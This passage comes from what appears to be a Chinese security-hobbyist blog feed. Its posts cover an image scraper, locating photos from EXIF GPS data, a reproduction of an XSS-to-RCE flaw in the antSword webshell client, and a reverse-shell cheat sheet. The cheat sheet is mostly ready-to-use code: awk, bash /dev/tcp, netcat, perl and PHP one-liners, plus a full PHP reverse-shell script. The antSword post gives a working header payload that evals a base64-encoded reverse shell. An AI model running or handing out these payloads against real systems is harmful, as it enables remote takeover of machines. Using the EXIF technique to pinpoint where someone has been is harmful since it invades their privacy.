class="hljs-comment"># print(all_src[i].img['data-original'])</span><br>            img_url = all_src[i].img[<span class="hljs-string">'data-original'</span>]<br>            html = requests.get(img_url, headers=header)<br>            <span class="hljs-comment"># Extract the file name from the url</span><br>            file_name = os.path.basename(img_url)<br>            fp = open(<span class="hljs-string">'./image/%s'</span> % file_name, <span class="hljs-string">'wb'</span>)<br>            fp.write(html.content)<br>            fp.close()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    print(<span class="hljs-string">"************************\n[*] 正在下载图片..."</span>)<br>    start = time.time()<br>    get_image()<br>    end = time.time()<br>    print(<span class="hljs-string">"下载完成，共耗时：%f s"</span> % (end - start))<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1dM9iaBKw3KVjSZTE763uRpXav.png"></p><p><img src="https://ae01.alicdn.com/kf/HTB1LCN2Xkxz61VjSZFt761DSVXan.png"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>单线程+300k左右的网速下载居然花了十多分钟。。。。。多线程后面再说吧^&gt;&lt;^</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次失败的手机图片定位</title>
      <link href="/posts/f8cabab2.html"/>
      <url>/posts/f8cabab2.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1Cb5jaBGw3KVjSZFDq6xWEpXak.jpg"></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>“之前”网上有条消息(好像是《社会工程：安全体系中的人性漏洞》一书里面的，网上也有相关的例子)–可以从一张图片定位出该图片的拍摄地点，从而知道“你”曾经去过的一些地方。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>网上已经有蛮多的例子了，以下我也是网上找的代码，然后进行改改组合起来，代码渣渣，大佬勿喷。</p><h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><p><strong>百度地图AK</strong></p><p><strong>手机原图照片(手机开启GPS且相机设置记录位置信息拍的照片)</strong></p><p>步骤：</p><p>使用python的<code>exifread</code>模块进行读取照片的exif信息，然后把里面的经纬度，拍照手机等信息提取出来。<br>提取出来后再格式化转换一下经纬度，然后调用百度度API进行查询，最后提取【省、市、区、街道】(格式化)等信息</p><p>代码如下：</p><figure class="hljs highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding: utf-8-*-</span><br><span class="hljs-comment"># _Author: Kuibahd </span><br><span class="hljs-comment"># Time：2019/5/10</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> division<br><span class="hljs-keyword">import</span> exifread, requests, json, re<br><br><br><span class="hljs-comment"># 提取img信息并获取拍照地点</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">imageread</span><span class="hljs-params">()</span>:</span><br>    f = open(<span class="hljs-string">"D:\\Pychram\\img\\IMG_20190510_201621.jpg"</span>, <span class="hljs-string">'rb'</span>)<br>    imagetext = exifread.process_file(f)<br>    <span class="hljs-comment"># for key in imagetext:</span><br>    <span class="hljs-comment">#     print(key, ":", imagetext[key])</span><br>    f.close()<br>    make = <span class="hljs-string">''</span><br>    ns = <span class="hljs-string">''</span><br>    ms = <span class="hljs-string">''</span><br>    <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> imagetext:<br>        <span class="hljs-keyword">if</span> q == <span class="hljs-string">"Image Make"</span>:<br>            make = imagetext[q]<br>        <span class="hljs-keyword">elif</span> q == <span class="hljs-string">"Image Model"</span>:<br>            model = imagetext[q]<br>            print(<span class="hljs-string">"拍摄图片手机："</span>, str(make) + <span class="hljs-string">' '</span> + str(model))<br>        <span class="hljs-keyword">elif</span> q == <span class="hljs-string">"Image DateTime"</span>:<br>            print(<span class="hljs-string">"图片拍摄时间："</span>, imagetext[q])<br>        <span class="hljs-keyword">elif</span> q == <span class="hljs-string">"GPS GPSLongitude"</span>:<br>            ns = imagetext[q]<br>            <span class="hljs-comment"># print("GPS经度：", imagetext[q], imagetext['GPS GPSLatitudeRef'])</span><br>            print(<span class="hljs-string">"GPS经度："</span>, imagetext[q])<br>        <span class="hljs-keyword">elif</span> q == <span class="hljs-string">"GPS GPSLatitude"</span>:<br>            ms = imagetext[q]<br>            <span class="hljs-comment"># print("GPS纬度：", imagetext[q], imagetext['GPS GPSLongitudeRef'])</span><br>            print(<span class="hljs-string">"GPS纬度："</span>, imagetext[q])<br><br>    <span class="hljs-comment"># 下面转换有些问题导致最后定位偏离了</span><br>    strs1 = str(ns)  <span class="hljs-comment"># 经度</span><br>    strs2 = str(ms)  <span class="hljs-comment"># 纬度</span><br>    <span class="hljs-comment"># 格式化经度</span><br>    e1 = strs1[:<span class="hljs-number">4</span>] + <span class="hljs-string">"°"</span> + strs1[<span class="hljs-number">6</span>:]<br>    e2 = e1[:<span class="hljs-number">6</span>] + <span class="hljs-string">"′"</span> + e1[<span class="hljs-number">8</span>:]<br>    e3 = e2[<span class="hljs-number">1</span>:<span class="hljs-number">9</span>] + <span class="hljs-string">"″"</span><br>    <span class="hljs-comment"># print(e3)</span><br><br>    <span class="hljs-comment"># 转换经度</span><br>    x1 = re.split(<span class="hljs-string">"°|′|″"</span>, e3)[:<span class="hljs-number">3</span>]<br>    x1 = list(map(int, x1))<br>    <span class="hljs-comment"># print(x1[0] + x1[1] / 60 + x1[2] / 3600)</span><br>    lng = str(x1[<span class="hljs-number">0</span>] + x1[<span class="hljs-number">1</span>] / <span class="hljs-number">60</span> + x1[<span class="hljs-number">2</span>] / <span class="hljs-number">3600</span>)<br><br>    <span class="hljs-comment"># 格式纬度</span><br>    n1 = strs2[:<span class="hljs-number">3</span>] + <span class="hljs-string">"°"</span> + strs2[<span class="hljs-number">5</span>:]<br>    n2 = n1[:<span class="hljs-number">6</span>] + <span class="hljs-string">"′"</span> + n1[<span class="hljs-number">7</span>:]<br>    n3 = n2[<span class="hljs-number">1</span>:<span class="hljs-number">9</span>] + <span class="hljs-string">"″"</span><br>    <span class="hljs-comment"># print(n3)</span><br><br>    <span class="hljs-comment"># 转换纬度</span><br>    x2 = re.split(<span class="hljs-string">"°|′|″"</span>, n3)[:<span class="hljs-number">3</span>]<br>    x2 = list(map(int, x2))<br>    <span class="hljs-comment"># print(x2[0] + x2[1] / 60 + x2[2] / 3600)</span><br>    lat = str(x2[<span class="hljs-number">0</span>] + x2[<span class="hljs-number">1</span>] / <span class="hljs-number">60</span> + x2[<span class="hljs-number">2</span>] / <span class="hljs-number">3600</span>)<br><br>    <span class="hljs-comment"># 根据经纬度获取地址</span><br>    ak = <span class="hljs-string">"XXXXXXXXXX"</span>  <span class="hljs-comment"># 百度map AK</span><br>    url = <span class="hljs-string">"http://api.map.baidu.com/geocoder/v2/"</span><br>    items = <span class="hljs-string">"?callback=renderReverse&amp;location=&#123;&#125;,&#123;&#125;&amp;output=json&amp;pois=1&amp;ak=&#123;&#125;"</span>.format(lat, lng, ak)<br>    req = requests.get(url + items, timeout=<span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># print(items)</span><br>    data = req.text<br><br>    <span class="hljs-comment"># 提取信息</span><br>    data = data.replace(<span class="hljs-string">"renderReverse&amp;&amp;renderReverse("</span>, <span class="hljs-string">""</span>)<br>    data = data[:<span class="hljs-number">-1</span>]<br>    baiduAddr = json.loads(data)<br>    province = baiduAddr[<span class="hljs-string">"result"</span>][<span class="hljs-string">"addressComponent"</span>][<span class="hljs-string">"province"</span>]<br>    city = baiduAddr[<span class="hljs-string">"result"</span>][<span class="hljs-string">"addressComponent"</span>][<span class="hljs-string">"city"</span>]<br>    district = baiduAddr[<span class="hljs-string">"result"</span>][<span class="hljs-string">"addressComponent"</span>][<span class="hljs-string">"district"</span>]<br>    street = baiduAddr[<span class="hljs-string">"result"</span>][<span class="hljs-string">"addressComponent"</span>][<span class="hljs-string">"street"</span>]<br>    formatted_address = baiduAddr[<span class="hljs-string">"result"</span>][<span class="hljs-string">"formatted_address"</span>]<br>    new_line = street + <span class="hljs-string">"|"</span> + formatted_address + <span class="hljs-string">"|"</span> + str(lng) + <span class="hljs-string">"|"</span> + str(<br>        lat) + <span class="hljs-string">"|"</span> + province + <span class="hljs-string">"|"</span> + city + <span class="hljs-string">"|"</span> + district<br>    print(<span class="hljs-string">"*****************************************\n拍摄图片位置："</span>)<br>    print(new_line)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    imageread()<br></code></pre></td></tr></table></figure><p>最终结果：</p><p><img src="https://ae01.alicdn.com/kf/HTB1bSOiaBKw3KVjSZTE763uRpXaZ.png"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>由于经纬度格式化、转换那里不是很懂，最后的定位结果(都)是偏离。。。。</p><p><img src="https://ae01.alicdn.com/kf/HTB1TfqcavWG3KVjSZFg762TspXaQ.png"></p><p><strong>Reference</strong></p><p><a href="http://www.cnblogs.com/shiguangliangchunshanbo/p/9745848.html" target="_blank" rel="noopener">http://www.cnblogs.com/shiguangliangchunshanbo/p/9745848.html</a><br><a href="https://blog.csdn.net/oYeZhou/article/details/82012471" target="_blank" rel="noopener">https://blog.csdn.net/oYeZhou/article/details/82012471</a><br><a href="https://blog.csdn.net/ChenVast/article/details/81669788" target="_blank" rel="noopener">https://blog.csdn.net/ChenVast/article/details/81669788</a><br><a href="https://blog.csdn.net/tyt_XiaoTao/article/details/80410279" target="_blank" rel="noopener">https://blog.csdn.net/tyt_XiaoTao/article/details/80410279</a><br><a href="https://www.zhihu.com/question/27043850" target="_blank" rel="noopener">https://www.zhihu.com/question/27043850</a><br><a href="https://www.cnblogs.com/shijingjing07/p/7474570.html" target="_blank" rel="noopener">https://www.cnblogs.com/shijingjing07/p/7474570.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE Vulnerability in antSword</title>
      <link href="/posts/4e91690d.html"/>
      <url>/posts/4e91690d.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB18FOoaBGw3KVjSZFwq6zQ2FXa1.jpg"></p><a id="more"></a><p>前几天蚁剑暴X(R)S(C)S(E)，所以复现看看</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">'HTTP/1.1 500 &lt;img src=# onerror=alert(/AntSword-XSS/)&gt;'</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB15QSiaA9E3KVjSZFG76319XXaR.png"></p><p><strong>弹shell</strong></p><p>写入自己喜欢的弹shell方式到，<code>exec()</code>内，然后进行base64加密</p><p>perl:</p><figure class="hljs highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">require</span>(<span class="hljs-string">'child_process'</span>).exec(<span class="hljs-string">'perl -e '</span><span class="hljs-keyword">use</span> Socket;$i=<span class="hljs-string">"127.0.0.1"</span>;$p=<span class="hljs-number">4444</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">"tcp"</span>));<span class="hljs-keyword">if</span>(<span class="hljs-keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">"/bin/bash -i"</span>);&#125;;<span class="hljs-string">''</span>,(error, stdout, stderr)=&gt;&#123;<br>    alert(<span class="hljs-string">`stdout: $&#123;stdout&#125;`</span>);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>python:</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">require(<span class="hljs-string">'child_process'</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">'python -c \’import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash”,”-i”]);\’’,(error, stdout, stderr)=&gt;&#123;</span><br><span class="hljs-string">    alert(`stdout: $&#123;stdout&#125;`);</span><br><span class="hljs-string">  &#125;);</span><br></code></pre></td></tr></table></figure><p>bash:</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">require(<span class="hljs-string">'child_process'</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">'bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1’,(error, stdout, stderr)=&gt;&#123;</span><br><span class="hljs-string">    alert(`stdout: $&#123;stdout&#125;`);</span><br><span class="hljs-string">  &#125;);</span><br></code></pre></td></tr></table></figure><p><strong>最终的exp</strong></p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">"HTTP/1.1 406 Not &lt;img src=# onerror='eval(new Buffer(`base64编码内容`,`base64`).toString())'&gt;"</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>nc监听4444，蚁剑添加webshell，双击打开后，成功弹回bash</p><p><img src="https://ae01.alicdn.com/kf/HTB1VN9jaBOD3KVjSZFF763n9pXaL.png" alt="0x02.png"></p><p><strong>PS：</strong></p><p>这里有个坑，就是，用py、bash、nc之类的弹不回shell，用perl就行。不知道怎么回事。后面再研究院研究</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X(R)S(C)S(E) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse-shells</title>
      <link href="/posts/8a802f59.html"/>
      <url>/posts/8a802f59.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1jk1rarys3KVjSZFnq6xFzpXaZ.jpg"></p><a id="more"></a><p>常用反弹shell姿势</p><p>原文作者：<a href="https://alamot.github.io/reverse_shells/" target="_blank" rel="noopener">Antonios Tsolis</a></p><h2 id="Awk"><a href="#Awk" class="headerlink" title="Awk"></a>Awk</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">'BEGIN &#123;s = "/inet/tcp/0/LHOST/LPORT"; while(42) &#123; do&#123; printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != "exit") close(s); &#125;&#125;'</span> /dev/null<br></code></pre></td></tr></table></figure><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/LOST/LPORT 0&gt;&amp;1<br><br>0&lt;&amp;196;<span class="hljs-built_in">exec</span> 196&lt;&gt;/dev/tcp/LHOST/LPORT; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br><br><span class="hljs-built_in">exec</span> 5&lt;&gt;/dev/tcp/LHOST/LPORT &amp;&amp; <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line 0&lt;&amp;5; <span class="hljs-keyword">do</span> <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r = Runtime.getRuntime(); p = r.exec([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/LHOST/LPORT;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[]); p.waitFor()<br></code></pre></td></tr></table></figure><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="#Netcat"></a>#Netcat</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash LHOST LPORT<br><br>/bin/bash|nc LHOST LPORT<br><br>rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc LHOST LPORT &gt;/tmp/f<br><br>rm -f backpipe; mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc LHOST LPORT 1&gt;/tmp/backpipe<br><br>rm -f backpipe; mknod /tmp/backpipe p &amp;&amp; nc LHOST LPORT 0&lt;backpipe | /bin/bash 1&gt;backpipe<br></code></pre></td></tr></table></figure><h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -MIO -e <span class="hljs-string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LPORT:LHOST");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span><br></code></pre></td></tr></table></figure><p><strong>Windows</strong></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -MIO -e <span class="hljs-string">'$c=new IO::Socket::INET(PeerAddr,"LPORT:LHOST");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span><br></code></pre></td></tr></table></figure><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("LHOST",LPORT);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("LHOST",LPORT);shell_exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("LHOST",LPORT);`/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("LHOST",LPORT);system("/bin/bash -i &lt;&amp;3 &gt;&amp; 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("LHOST",LPORT);popen("/bin/bash -i &lt;&amp;3 &gt;&amp; 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure><p>php写成一行</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php set_time_limit (0); <span class="hljs-variable">$VERSION</span> = <span class="hljs-string">"1.0"</span>; <span class="hljs-variable">$ip</span> = <span class="hljs-string">"LHOST"</span>; <span class="hljs-variable">$port</span> = LPORT; <span class="hljs-variable">$chunk_size</span> = 1400; <span class="hljs-variable">$write_a</span> = null; <span class="hljs-variable">$error_a</span> = null; <span class="hljs-variable">$shell</span> = <span class="hljs-string">"uname -a; w; id; /bin/bash -i"</span>; <span class="hljs-variable">$daemon</span> = 0; <span class="hljs-variable">$debug</span> = 0; <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">"pcntl_fork"</span>)) &#123; <span class="hljs-variable">$pid</span> = pcntl_fork(); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -1) &#123; printit(<span class="hljs-string">"ERROR: Cannot fork"</span>); <span class="hljs-built_in">exit</span>(1); &#125; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123; <span class="hljs-built_in">exit</span>(0); &#125; <span class="hljs-keyword">if</span> (posix_setsid() == -1) &#123; printit(<span class="hljs-string">"Error: Cannot setsid()"</span>); <span class="hljs-built_in">exit</span>(1); &#125; <span class="hljs-variable">$daemon</span> = 1; &#125; <span class="hljs-keyword">else</span> &#123; printit(<span class="hljs-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>); &#125; <span class="hljs-built_in">chdir</span>(<span class="hljs-string">"/"</span>); <span class="hljs-built_in">umask</span>(0); <span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30); <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123; printit(<span class="hljs-string">"<span class="hljs-variable">$errstr</span> (<span class="hljs-variable">$errno</span>)"</span>); <span class="hljs-built_in">exit</span>(1); &#125; <span class="hljs-variable">$descriptorspec</span> = array(0 =&gt; array(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>), 1 =&gt; array(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>), 2 =&gt; array(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>)); <span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>); <span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$process</span>)) &#123; printit(<span class="hljs-string">"ERROR: Cannot spawn shell"</span>); <span class="hljs-built_in">exit</span>(1); &#125; stream_set_blocking(<span class="hljs-variable">$pipes</span>[0], 0); stream_set_blocking(<span class="hljs-variable">$pipes</span>[1], 0); stream_set_blocking(<span class="hljs-variable">$pipes</span>[2], 0); stream_set_blocking(<span class="hljs-variable">$sock</span>, 0); printit(<span class="hljs-string">"Successfully opened reverse shell to <span class="hljs-variable">$ip</span>:<span class="hljs-variable">$port</span>"</span>); <span class="hljs-keyword">while</span> (1) &#123; <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$sock</span>)) &#123; printit(<span class="hljs-string">"ERROR: Shell connection terminated"</span>); <span class="hljs-built_in">break</span>; &#125; <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$pipes</span>[1])) &#123; printit(<span class="hljs-string">"ERROR: Shell process terminated"</span>); <span class="hljs-built_in">break</span>; &#125; <span class="hljs-variable">$read_a</span> = array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$pipes</span>[2]); <span class="hljs-variable">$num_changed_sockets</span> = stream_select(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, null); <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"SOCK READ"</span>); <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"SOCK: <span class="hljs-variable">$input</span>"</span>); fwrite(<span class="hljs-variable">$pipes</span>[0], <span class="hljs-variable">$input</span>); &#125; <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$read_a</span>)) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDOUT READ"</span>); <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$chunk_size</span>); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDOUT: <span class="hljs-variable">$input</span>"</span>); fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>); &#125; <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$read_a</span>)) &#123; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDERR READ"</span>); <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$chunk_size</span>); <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDERR: <span class="hljs-variable">$input</span>"</span>); fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>); &#125; &#125; fclose(<span class="hljs-variable">$sock</span>); fclose(<span class="hljs-variable">$pipes</span>[0]); fclose(<span class="hljs-variable">$pipes</span>[1]); fclose(<span class="hljs-variable">$pipes</span>[2]); proc_close(<span class="hljs-variable">$process</span>); <span class="hljs-keyword">function</span> printit (<span class="hljs-variable">$string</span>) &#123;  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123; <span class="hljs-built_in">print</span> <span class="hljs-string">"<span class="hljs-variable">$string</span>\\n"</span>; &#125; &#125; ?&gt;<br></code></pre></td></tr></table></figure><h2 id="Powershell"><a href="#Powershell" class="headerlink" 